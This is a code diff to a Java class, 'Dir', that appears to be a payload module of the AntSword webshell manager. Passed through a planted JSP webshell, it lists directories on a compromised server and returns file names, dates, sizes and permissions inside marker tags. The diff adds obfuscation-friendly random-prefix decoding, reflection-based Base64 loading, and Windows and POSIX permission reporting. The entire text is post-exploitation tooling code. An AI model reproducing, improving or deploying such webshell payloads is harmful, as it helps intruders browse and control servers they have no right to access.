@@ -15,19 +15,21 @@ import java.util.Set;
 public class Dir {
     public String encoder;
     public String cs;
+    public String randomPrefix;
 
     @Override
     public boolean equals(Object obj) {
         PageContext page = (PageContext) obj;
         ServletRequest request = page.getRequest();
         ServletResponse response = page.getResponse();
-        encoder = request.getParameter("encoder") != null ? request.getParameter("encoder") : "";
-        cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
+        randomPrefix = "antswordrandomPrefix";
+        encoder = "base64";
+        cs = "antswordCharset";
         StringBuffer output = new StringBuffer("");
         StringBuffer sb = new StringBuffer("");
         String tag_s = "->|";
         String tag_e = "|<-";
-        String varkey1 = "antswordarg1";
+        String varkey1 = "antswordargpath";
         try {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
@@ -50,6 +52,13 @@ public class Dir {
     }
 
     String decode(String str, String encode, String cs) throws Exception {
+        int prefixlen = 0;
+        try {
+            prefixlen = Integer.parseInt(randomPrefix);
+            str = str.substring(prefixlen);
+        } catch (Exception e) {
+            prefixlen = 0;
+        }
         if (encode.equals("hex") || encode == "hex") {
             if (str == "null" || str.equals("null")) {
                 return "";
@@ -65,8 +74,17 @@ public class Dir {
             return baos.toString("UTF-8");
         } else if (encode.equals("base64") || encode == "base64") {
             byte[] bt = null;
-            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
-            bt = decoder.decodeBuffer(str);
+            String version = System.getProperty("java.version");
+            if (version.compareTo("1.9") >= 0) {
+                Class Base64 = Class.forName("java.util.Base64");
+                Object Decoder = Base64.getMethod("getDecoder", new Class[0]).invoke(Base64, new  Object[]{});
+                bt = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, str);   
+            } else {
+                Class Base64 = Class.forName("sun.misc.BASE64Decoder");
+                Object Decoder = Base64.getDeclaredConstructor().newInstance();
+                bt = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, str);
+            }
+            
             return new String(bt, "UTF-8");
         }
         return str;
@@ -81,9 +99,13 @@ public class Dir {
         for (int i = 0; i < l.length; i++) {
             dt = new java.util.Date(l[i].lastModified());
             sT = fm.format(dt);
-//            sQ = l[i].canRead() ? "R" : "";
-//            sQ += l[i].canWrite() ? " W" : "";
-            sQ = getPermissions(l[i].toString());
+            if (isWin()) {
+                sQ = l[i].canRead() ? "R" : "-";
+                sQ += l[i].canWrite() ? "W" : "-";
+                sQ += l[i].canExecute() ? "X": "-";
+            }else{
+                sQ = getPosixFilePermissions(l[i].toString());
+            }
             String nm = new String(l[i].getName().getBytes(fileCode), cs);
             if (l[i].isDirectory()) {
                 s += nm + "/\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
@@ -95,7 +117,7 @@ public class Dir {
         return new String(s.getBytes(fileCode), cs);
     }
 
-    String getPermissions(String sourceFile) {
+    String getPosixFilePermissions(String sourceFile) {
         int ownerPermissions = 0;
         int groupPermissions = 0;
         int othersPermissions = 0;
@@ -137,5 +159,13 @@ public class Dir {
         }
         return "0" + String.valueOf(ownerPermissions) + String.valueOf(groupPermissions)
                 + String.valueOf(othersPermissions);
+    }
+
+    boolean isWin() {
+        String osname = (String) System.getProperty("os.name");
+        osname = osname.toLowerCase();
+        if (osname.startsWith("win"))
+            return true;
+        return false;
     }
 }
